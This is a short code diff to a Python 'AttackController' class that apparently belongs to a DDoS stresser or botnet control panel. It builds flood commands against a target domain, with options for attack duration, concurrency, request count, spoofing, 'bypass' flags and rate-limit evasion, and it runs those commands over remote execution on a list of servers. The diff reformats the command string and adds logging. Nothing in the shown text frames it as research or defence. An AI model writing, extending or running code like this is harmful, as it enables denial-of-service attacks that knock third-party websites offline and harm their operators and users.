@@ -107,8 +107,9 @@ class AttackController:
 
         for server in serverList:
             # Generate command using server-specific node path
-            command = f"xvfb-run {server['nodePath']} {attackCommand}"
+            command = f"{attackCommand}"
             
+            print(f"Executing command on {server['hostName']}: {command}")
             success, error = self._executeRemoteCommand(
                 server['hostName'],
                 server['userName'],
@@ -215,7 +216,7 @@ class AttackController:
         if modeValue == 'xvfb-run node hyna.js':
             attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --ratelimit {bypassRateLimitValue}'
         else:
-            attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} --ratelimit {bypassRateLimitValue}'
+            attackCommand = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} {death_sword_http} --ratelimit {bypassRateLimitValue}'
         attackCommand = ' '.join(attackCommand.split())
 
         print(attackCommand)
